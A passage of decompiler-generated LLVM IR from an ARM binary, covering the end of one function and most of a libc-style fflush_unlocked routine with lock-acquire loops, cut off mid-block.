dec_label_pc_17a50.dec_label_pc_17a44_crit_edge:  ; preds = %dec_label_pc_17a50
  %v0_17a44.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a48.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17a44 = inttoptr i32 %v0_17a44.pre to i32*
  %v2_17a44 = load i32, i32* %v1_17a44, align 4
  store i32 %v2_17a44, i32* %r3.global-to-local, align 4
  %v3_17a48 = icmp uge i32 %v2_17a44, %v1_17a48.pre
  store i1 %v3_17a48, i1* %cpsr_c.global-to-local, align 1
  %v9_17a48 = icmp eq i32 %v2_17a44, %v1_17a48.pre
  br i1 %v9_17a48, label %dec_label_pc_17a50, label %dec_label_pc_17a68

dec_label_pc_17a64:                               ; preds = %dec_label_pc_17a50
  %v0_17a64 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17a64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a68

dec_label_pc_17a68:                               ; preds = %dec_label_pc_17a38, %dec_label_pc_17a50.dec_label_pc_17a44_crit_edge, %dec_label_pc_17a64
  %v0_17a70 = phi i32 [ %v0_17a64, %dec_label_pc_17a64 ], [ %v2_17a4462, %dec_label_pc_17a38 ], [ %v2_17a44, %dec_label_pc_17a50.dec_label_pc_17a44_crit_edge ]
  %v1_17a68 = phi i32 [ %v0_17a64, %dec_label_pc_17a64 ], [ %v2_17a38, %dec_label_pc_17a38 ], [ %v1_17a48.pre, %dec_label_pc_17a50.dec_label_pc_17a44_crit_edge ]
  %v3_17a68 = icmp uge i32 %v0_17a70, %v1_17a68
  store i1 %v3_17a68, i1* %cpsr_c.global-to-local, align 1
  %v9_17a68 = icmp eq i32 %v0_17a70, %v1_17a68
  br i1 %v9_17a68, label %dec_label_pc_17a70, label %dec_label_pc_17a68.dec_label_pc_17a38_crit_edge

dec_label_pc_17a68.dec_label_pc_17a38_crit_edge:  ; preds = %dec_label_pc_17a68
  %v0_17a38.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a38

dec_label_pc_17a70:                               ; preds = %dec_label_pc_17a68
  %v2_17a70 = icmp ne i32 %v1_17a68, 0
  store i1 %v2_17a70, i1* %cpsr_c.global-to-local, align 1
  %v7_17a74 = icmp slt i32 %v1_17a68, 2
  br i1 %v7_17a74, label %dec_label_pc_17a90, label %dec_label_pc_17a78

dec_label_pc_17a78:                               ; preds = %dec_label_pc_17a70
  %v0_17a78 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17a78, i32* %r0.global-to-local, align 4
  %v0_17a7c = load i32, i32* %r1.global-to-local, align 4
  %v1_17a7c = add i32 %v0_17a7c, 129
  store i32 %v1_17a7c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_17a90:                               ; preds = %dec_label_pc_17a00, %dec_label_pc_17a78, %dec_label_pc_17a70
  %v2_17a94 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17a94, i32* %r4.global-to-local, align 4
  %v1_17a98 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17a98

; uselistorder directives
  uselistorder i32 %v0_17a64, { 1, 0, 2 }
  uselistorder i32 %v1_17a48.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17a38, { 1, 0 }
  uselistorder i32 %v0_179c4, { 1, 0, 2 }
  uselistorder i32 %v1_179a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17998, { 1, 0 }
  uselistorder i32 %v0_17964, { 2, 1, 0 }
  uselistorder i32 %v0_17908, { 1, 0 }
  uselistorder i32 %v0_178ec, { 1, 0, 2 }
  uselistorder i32 %v1_178d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_178bc, { 1, 0 }
  uselistorder i32 %v0_17860, { 1, 0, 2 }
  uselistorder i32 %v1_17844.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_17818, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 9, 10, 12, 11, 42, 13, 14, 15, 39, 40, 16, 17, 18, 19, 20, 21, 22, 24, 23, 43, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 44, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 20, 21, 3, 4, 5, 6, 22, 23, 7, 10, 8, 9, 19, 11, 12, 24, 25, 13, 14, 15, 16, 17, 26, 27, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 6, 0, 15, 7, 8, 9, 2, 10, 3, 11, 1, 12, 13, 4, 14, 5 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17a90, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17a68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a50, { 1, 0 }
  uselistorder label %dec_label_pc_17a00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_179f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_179c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_179b0, { 1, 0 }
  uselistorder label %dec_label_pc_17964, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1792c, { 1, 0 }
  uselistorder label %dec_label_pc_17900, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_178f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_178d8, { 1, 0 }
  uselistorder label %dec_label_pc_17874, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_17864, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1784c, { 1, 0 }
}

define i32 @function_17aa0(i32 %arg1) local_unnamed_addr {
dec_label_pc_17aa0:
  %v0_17aa0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17aa0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17aa0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17aa0, %bb
  %v10_17ab4 = phi i32 [ %arg1, %dec_label_pc_17aa0 ], [ 0, %bb ]
  ret i32 %v10_17ab4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_17ab8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r6, align 4
  %v4_17ac8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 76) to i32*), align 4
  store i32 %v4_17ac8, i32* %r3.global-to-local, align 4
  %v4_17acc = icmp uge i32 %tmp, %v4_17ac8
  store i1 %v4_17acc, i1* %cpsr_c.global-to-local, align 1
  %v10_17acc = icmp eq i32 %tmp, %v4_17ac8
  br i1 %v10_17acc, label %bb, label %dec_label_pc_17ae4

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_17af4

dec_label_pc_17ae4:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_17ae8 = icmp eq i16* %arg1, null
  br i1 %v3_17ae8, label %dec_label_pc_17af4, label %dec_label_pc_17e08

dec_label_pc_17af4:                               ; preds = %bb, %dec_label_pc_17ae4
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_17ae4 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_17af8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 160) to i32*), align 4
  store i32 %v4_17af8, i32* %r5.global-to-local, align 4
  %v0_17afc = call i32 @__aeabi_read_tp()
  store i32 %v0_17afc, i32* %r0.global-to-local, align 4
  %v1_17b00 = add i32 %v4_17af8, 8
  %v2_17b00 = inttoptr i32 %v1_17b00 to i32*
  %v3_17b00 = load i32, i32* %v2_17b00, align 4
  store i32 %v3_17b00, i32* %r3.global-to-local, align 4
  %v1_17b04 = add i32 %v0_17afc, -1168
  store i32 %v1_17b04, i32* %r8.global-to-local, align 4
  %v3_17b08 = icmp uge i32 %v3_17b00, %v1_17b04
  store i1 %v3_17b08, i1* %cpsr_c.global-to-local, align 1
  %v9_17b08 = icmp eq i32 %v3_17b00, %v1_17b04
  br i1 %v9_17b08, label %dec_label_pc_17b50, label %dec_label_pc_17b10

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17af4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17af8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17b1c143 = inttoptr i32 %v4_17af8 to i32*
  %v2_17b1c144 = load i32, i32* %v1_17b1c143, align 4
  store i32 %v2_17b1c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17b20146 = icmp eq i32 %v2_17b1c144, 0
  br i1 %v9_17b20146, label %dec_label_pc_17b28, label %dec_label_pc_17b40

dec_label_pc_17b28:                               ; preds = %dec_label_pc_17b10, %dec_label_pc_17b28.dec_label_pc_17b1c_crit_edge
  %v0_17b28147 = phi i32 [ %v1_17b20.pre, %dec_label_pc_17b28.dec_label_pc_17b1c_crit_edge ], [ 0, %dec_label_pc_17b10 ]
  store i32 %v0_17b28147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17b38 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17b38, label %dec_label_pc_17b3c, label %dec_label_pc_17b28.dec_label_pc_17b1c_crit_edge

dec_label_pc_17b28.dec_label_pc_17b1c_crit_edge:  ; preds = %dec_label_pc_17b28
  %v0_17b1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17b20.pre = load i32, i32* @r4, align 4
  %v1_17b1c = inttoptr i32 %v0_17b1c.pre to i32*
  %v2_17b1c = load i32, i32* %v1_17b1c, align 4
  store i32 %v2_17b1c, i32* %r3.global-to-local, align 4
  %v3_17b20 = icmp uge i32 %v2_17b1c, %v1_17b20.pre
  store i1 %v3_17b20, i1* %cpsr_c.global-to-local, align 1
  %v9_17b20 = icmp eq i32 %v2_17b1c, %v1_17b20.pre
  br i1 %v9_17b20, label %dec_label_pc_17b28, label %dec_label_pc_17b40

dec_label_pc_17b3c:                               ; preds = %dec_label_pc_17b28
  %v0_17b3c = load i32, i32* @r4, align 4
  store i32 %v0_17b3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17b40

dec_label_pc_17b40:                               ; preds = %dec_label_pc_17b10, %dec_label_pc_17b28.dec_label_pc_17b1c_crit_edge, %dec_label_pc_17b3c
  %v0_17b40 = phi i32 [ %v0_17b3c, %dec_label_pc_17b3c ], [ %v2_17b1c144, %dec_label_pc_17b10 ], [ %v2_17b1c, %dec_label_pc_17b28.dec_label_pc_17b1c_crit_edge ]
  %v1_17b40 = phi i32 [ %v0_17b3c, %dec_label_pc_17b3c ], [ 0, %dec_label_pc_17b10 ], [ %v1_17b20.pre, %dec_label_pc_17b28.dec_label_pc_17b1c_crit_edge ]
  %v3_17b40 = icmp uge i32 %v0_17b40, %v1_17b40
  store i1 %v3_17b40, i1* %cpsr_c.global-to-local, align 1
  %v9_17b40 = icmp eq i32 %v0_17b40, %v1_17b40
  br i1 %v9_17b40, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_17b40
  %v1_17b44 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17b44, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_17b40, %bb65
  %v1_17b48 = xor i1 %v9_17b40, true
  call void @__pseudo_cond_branch(i1 %v1_17b48, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_17b4c = load i32, i32* %r8.global-to-local, align 4
  %v1_17b4c = load i32, i32* %r5.global-to-local, align 4
  %v2_17b4c = add i32 %v1_17b4c, 8
  %v3_17b4c = inttoptr i32 %v2_17b4c to i32*
  store i32 %v0_17b4c, i32* %v3_17b4c, align 4
  br label %dec_label_pc_17b50

dec_label_pc_17b50:                               ; preds = %dec_label_pc_17af4, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17b54 = load i32, i32* @r6, align 4
  %v2_17b54 = add i32 %v0_17b54, 160
  %v3_17b54 = inttoptr i32 %v2_17b54 to i32*
  %v4_17b54 = load i32, i32* %v3_17b54, align 4
  store i32 %v4_17b54, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17b5c = add i32 %v0_17b54, 12
  %v3_17b5c = inttoptr i32 %v2_17b5c to i32*
  %v4_17b5c = load i32, i32* %v3_17b5c, align 4
  store i32 %v4_17b5c, i32* %r2.global-to-local, align 4
  %v1_17b60 = add i32 %v4_17b54, 4
  %v2_17b60 = inttoptr i32 %v1_17b60 to i32*
  %v3_17b60 = load i32, i32* %v2_17b60, align 4
  store i32 %v3_17b60, i32* %r1.global-to-local, align 4
  %v1_17b64 = inttoptr i32 %v4_17b5c to i32*
  %v2_17b64 = load i32, i32* %v1_17b64, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17b68 = icmp eq i32 %v3_17b60, 0
  %v1_17b6c = add i32 %v2_17b64, 1
  store i32 %v1_17b6c, i32* %r3.global-to-local, align 4
  store i32 %v1_17b6c, i32* %v1_17b64, align 4
  br i1 %v2_17b68, label %dec_label_pc_17b78, label %dec_label_pc_17bd8

dec_label_pc_17b78:                               ; preds = %dec_label_pc_17b50
  %v0_17b78 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b78 = load i32, i32* %r0.global-to-local, align 4
  %v2_17b78 = add i32 %v1_17b78, 8
  %v3_17b78 = inttoptr i32 %v2_17b78 to i32*
  store i32 %v0_17b78, i32* %v3_17b78, align 4
  %v0_17b7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17b7c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17b80

dec_label_pc_17b80:                               ; preds = %dec_label_pc_17bb0.dec_label_pc_17b80_crit_edge, %dec_label_pc_17b78
  %v0_17b80 = phi i32 [ %v0_17b80.pre, %dec_label_pc_17bb0.dec_label_pc_17b80_crit_edge ], [ %v0_17b7c, %dec_label_pc_17b78 ]
  %v1_17b80 = inttoptr i32 %v0_17b80 to i32*
  %v2_17b80 = load i32, i32* %v1_17b80, align 4
  store i32 %v2_17b80, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17b80, i32* %r2.global-to-local, align 4
  %v2_17b8c131 = load i32, i32* %v1_17b80, align 4
  store i32 %v2_17b8c131, i32* %r3.global-to-local, align 4
  %v3_17b90133 = icmp uge i32 %v2_17b8c131, %v2_17b80
  store i1 %v3_17b90133, i1* %cpsr_c.global-to-local, align 1
  %v9_17b90139 = icmp eq i32 %v2_17b8c131, %v2_17b80
  br i1 %v9_17b90139, label %dec_label_pc_17b98, label %dec_label_pc_17bb0

dec_label_pc_17b98:                               ; preds = %dec_label_pc_17b80, %dec_label_pc_17b98.dec_label_pc_17b8c_crit_edge
  %v0_17b98140 = phi i32 [ %v1_17b90.pre, %dec_label_pc_17b98.dec_label_pc_17b8c_crit_edge ], [ %v2_17b80, %dec_label_pc_17b80 ]
  store i32 %v0_17b98140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17ba8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17ba8, label %dec_label_pc_17bac, label %dec_label_pc_17b98.dec_label_pc_17b8c_crit_edge

dec_label_pc_17b98.dec_label_pc_17b8c_crit_edge:  ; preds = %dec_label_pc_17b98
  %v0_17b8c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17b90.pre = load i32, i32* @r4, align 4
  %v1_17b8c = inttoptr i32 %v0_17b8c.pre to i32*
  %v2_17b8c = load i32, i32* %v1_17b8c, align 4
  store i32 %v2_17b8c, i32* %r3.global-to-local, align 4
  %v3_17b90 = icmp uge i32 %v2_17b8c, %v1_17b90.pre
  store i1 %v3_17b90, i1* %cpsr_c.global-to-local, align 1
  %v9_17b90 = icmp eq i32 %v2_17b8c, %v1_17b90.pre
  br i1 %v9_17b90, label %dec_label_pc_17b98, label %dec_label_pc_17bb0

dec_label_pc_17bac:                               ; preds = %dec_label_pc_17b98
  %v0_17bac = load i32, i32* @r4, align 4
  store i32 %v0_17bac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17bb0

dec_label_pc_17bb0:                               ; preds = %dec_label_pc_17b80, %dec_label_pc_17b98.dec_label_pc_17b8c_crit_edge, %dec_label_pc_17bac
  %v0_17bb8 = phi i32 [ %v0_17bac, %dec_label_pc_17bac ], [ %v2_17b8c131, %dec_label_pc_17b80 ], [ %v2_17b8c, %dec_label_pc_17b98.dec_label_pc_17b8c_crit_edge ]
  %v1_17bb0 = phi i32 [ %v0_17bac, %dec_label_pc_17bac ], [ %v2_17b80, %dec_label_pc_17b80 ], [ %v1_17b90.pre, %dec_label_pc_17b98.dec_label_pc_17b8c_crit_edge ]
  %v3_17bb0 = icmp uge i32 %v0_17bb8, %v1_17bb0
  store i1 %v3_17bb0, i1* %cpsr_c.global-to-local, align 1
  %v9_17bb0 = icmp eq i32 %v0_17bb8, %v1_17bb0
  br i1 %v9_17bb0, label %dec_label_pc_17bb8, label %dec_label_pc_17bb0.dec_label_pc_17b80_crit_edge

dec_label_pc_17bb0.dec_label_pc_17b80_crit_edge:  ; preds = %dec_label_pc_17bb0
  %v0_17b80.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17b80

dec_label_pc_17bb8:                               ; preds = %dec_label_pc_17bb0
  %v2_17bb8 = icmp ne i32 %v1_17bb0, 0
  store i1 %v2_17bb8, i1* %cpsr_c.global-to-local, align 1
  %v7_17bbc = icmp slt i32 %v1_17bb0, 2
  br i1 %v7_17bbc, label %dec_label_pc_17bd8, label %dec_label_pc_17bc0

dec_label_pc_17bc0:                               ; preds = %dec_label_pc_17bb8
  %v0_17bc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17bc0, i32* %r0.global-to-local, align 4
  %v0_17bc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_17bc4 = add i32 %v0_17bc4, 129
  store i32 %v1_17bc4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17bd8

dec_label_pc_17bd8:                               ; preds = %dec_label_pc_17b50, %dec_label_pc_17bc0, %dec_label_pc_17bb8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17bdc = load i32, i32* @r6, align 4
  %v2_17bdc = add i32 %v0_17bdc, 152
  %v3_17bdc = inttoptr i32 %v2_17bdc to i32*
  %v4_17bdc = load i32, i32* %v3_17bdc, align 4
  store i32 %v4_17bdc, i32* %r5.global-to-local, align 4
  %v1_17be0 = add i32 %v4_17bdc, 8
  %v2_17be0 = inttoptr i32 %v1_17be0 to i32*
  %v3_17be0 = load i32, i32* %v2_17be0, align 4
  store i32 %v3_17be0, i32* %r3.global-to-local, align 4
  %v1_17be4 = load i32, i32* %r8.global-to-local, align 4
  %v3_17be4 = icmp uge i32 %v3_17be0, %v1_17be4
  store i1 %v3_17be4, i1* %cpsr_c.global-to-local, align 1
  %v9_17be4 = icmp eq i32 %v3_17be0, %v1_17be4
  br i1 %v9_17be4, label %dec_label_pc_17c2c, label %dec_label_pc_17bec

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17bd8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17bdc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17bf8123 = inttoptr i32 %v4_17bdc to i32*
  %v2_17bf8124 = load i32, i32* %v1_17bf8123, align 4
  store i32 %v2_17bf8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17bfc126 = icmp eq i32 %v2_17bf8124, 0
  br i1 %v9_17bfc126, label %dec_label_pc_17c04, label %dec_label_pc_17c1c

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17bec, %dec_label_pc_17c04.dec_label_pc_17bf8_crit_edge
  %v0_17c04127 = phi i32 [ %v1_17bfc.pre, %dec_label_pc_17c04.dec_label_pc_17bf8_crit_edge ], [ 0, %dec_label_pc_17bec ]
  store i32 %v0_17c04127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17c14 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17c14, label %dec_label_pc_17c18, label %dec_label_pc_17c04.dec_label_pc_17bf8_crit_edge

dec_label_pc_17c04.dec_label_pc_17bf8_crit_edge:  ; preds = %dec_label_pc_17c04
  %v0_17bf8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17bfc.pre = load i32, i32* @r4, align 4
  %v1_17bf8 = inttoptr i32 %v0_17bf8.pre to i32*
  %v2_17bf8 = load i32, i32* %v1_17bf8, align 4
  store i32 %v2_17bf8, i32* %r3.global-to-local, align 4
  %v3_17bfc = icmp uge i32 %v2_17bf8, %v1_17bfc.pre
  store i1 %v3_17bfc, i1* %cpsr_c.global-to-local, align 1
  %v9_17bfc = icmp eq i32 %v2_17bf8, %v1_17bfc.pre
  br i1 %v9_17bfc, label %dec_label_pc_17c04, label %dec_label_pc_17c1c

dec_label_pc_17c18:                               ; preds = %dec_label_pc_17c04
  %v0_17c18 = load i32, i32* @r4, align 4
  store i32 %v0_17c18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c1c

dec_label_pc_17c1c:                               ; preds = %dec_label_pc_17bec, %dec_label_pc_17c04.dec_label_pc_17bf8_crit_edge, %dec_label_pc_17c18
  %v0_17c1c = phi i32 [ %v0_17c18, %dec_label_pc_17c18 ], [ %v2_17bf8124, %dec_label_pc_17bec ], [ %v2_17bf8, %dec_label_pc_17c04.dec_label_pc_17bf8_crit_edge ]
  %v1_17c1c = phi i32 [ %v0_17c18, %dec_label_pc_17c18 ], [ 0, %dec_label_pc_17bec ], [ %v1_17bfc.pre, %dec_label_pc_17c04.dec_label_pc_17bf8_crit_edge ]
  %v3_17c1c = icmp uge i32 %v0_17c1c, %v1_17c1c
  store i1 %v3_17c1c, i1* %cpsr_c.global-to-local, align 1
  %v9_17c1c = icmp eq i32 %v0_17c1c, %v1_17c1c
  br i1 %v9_17c1c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_17c1c
  %v1_17c20 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17c20, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_17c1c, %bb67
  %v1_17c24 = xor i1 %v9_17c1c, true
  call void @__pseudo_cond_branch(i1 %v1_17c24, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_17c28 = load i32, i32* %r8.global-to-local, align 4
  %v1_17c28 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c28 = add i32 %v1_17c28, 8
  %v3_17c28 = inttoptr i32 %v2_17c28 to i32*
  store i32 %v0_17c28, i32* %v3_17c28, align 4
  %v0_17c30.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17c2c

dec_label_pc_17c2c:                               ; preds = %dec_label_pc_17bd8, %bb68
  %v0_17c3c = phi i32 [ %v0_17bdc, %dec_label_pc_17bd8 ], [ %v0_17c30.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17c30 = add i32 %v0_17c3c, 152
  %v3_17c30 = inttoptr i32 %v2_17c30 to i32*
  %v4_17c30 = load i32, i32* %v3_17c30, align 4
  store i32 %v4_17c30, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_17c38 = add i32 %v4_17c30, 4
  %v2_17c38 = inttoptr i32 %v1_17c38 to i32*
  %v3_17c38 = load i32, i32* %v2_17c38, align 4
  store i32 %v3_17c38, i32* %r1.global-to-local, align 4
  %v2_17c3c = add i32 %v0_17c3c, 76
  %v3_17c3c = inttoptr i32 %v2_17c3c to i32*
  %v4_17c3c = load i32, i32* %v3_17c3c, align 4
  store i32 %v4_17c3c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17c40 = icmp eq i32 %v3_17c38, 0
  %v1_17c44 = inttoptr i32 %v4_17c3c to i32*
  %v2_17c44 = load i32, i32* %v1_17c44, align 4
  store i32 %v2_17c44, i32* @r5, align 4
  br i1 %v2_17c40, label %dec_label_pc_17c4c, label %dec_label_pc_17cac

dec_label_pc_17c4c:                               ; preds = %dec_label_pc_17c2c
  %v2_17c4c = add i32 %v4_17c30, 8
  %v3_17c4c = inttoptr i32 %v2_17c4c to i32*
  store i32 0, i32* %v3_17c4c, align 4
  %v0_17c50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17c50, i32* @r7, align 4
  br label %dec_label_pc_17c54

dec_label_pc_17c54:                               ; preds = %dec_label_pc_17c84.dec_label_pc_17c54_crit_edge, %dec_label_pc_17c4c
  %v0_17c54 = phi i32 [ %v0_17c54.pre, %dec_label_pc_17c84.dec_label_pc_17c54_crit_edge ], [ %v0_17c50, %dec_label_pc_17c4c ]
  %v1_17c54 = inttoptr i32 %v0_17c54 to i32*
  %v2_17c54 = load i32, i32* %v1_17c54, align 4
  store i32 %v2_17c54, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17c54, i32* %r2.global-to-local, align 4
  %v2_17c60111 = load i32, i32* %v1_17c54, align 4
  store i32 %v2_17c60111, i32* %r3.global-to-local, align 4
  %v3_17c64113 = icmp uge i32 %v2_17c60111, %v2_17c54
  store i1 %v3_17c64113, i1* %cpsr_c.global-to-local, align 1
  %v9_17c64119 = icmp eq i32 %v2_17c60111, %v2_17c54
  br i1 %v9_17c64119, label %dec_label_pc_17c6c, label %dec_label_pc_17c84

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17c54, %dec_label_pc_17c6c.dec_label_pc_17c60_crit_edge
  %v0_17c6c120 = phi i32 [ %v1_17c64.pre, %dec_label_pc_17c6c.dec_label_pc_17c60_crit_edge ], [ %v2_17c54, %dec_label_pc_17c54 ]
  store i32 %v0_17c6c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17c7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17c7c, label %dec_label_pc_17c80, label %dec_label_pc_17c6c.dec_label_pc_17c60_crit_edge

dec_label_pc_17c6c.dec_label_pc_17c60_crit_edge:  ; preds = %dec_label_pc_17c6c
  %v0_17c60.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17c64.pre = load i32, i32* @r4, align 4
  %v1_17c60 = inttoptr i32 %v0_17c60.pre to i32*
  %v2_17c60 = load i32, i32* %v1_17c60, align 4
  store i32 %v2_17c60, i32* %r3.global-to-local, align 4
  %v3_17c64 = icmp uge i32 %v2_17c60, %v1_17c64.pre
  store i1 %v3_17c64, i1* %cpsr_c.global-to-local, align 1
  %v9_17c64 = icmp eq i32 %v2_17c60, %v1_17c64.pre
  br i1 %v9_17c64, label %dec_label_pc_17c6c, label %dec_label_pc_17c84

dec_label_pc_17c80:                               ; preds = %dec_label_pc_17c6c
  %v0_17c80 = load i32, i32* @r4, align 4
  store i32 %v0_17c80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17c84

dec_label_pc_17c84:                               ; preds = %dec_label_pc_17c54, %dec_label_pc_17c6c.dec_label_pc_17c60_crit_edge, %dec_label_pc_17c80
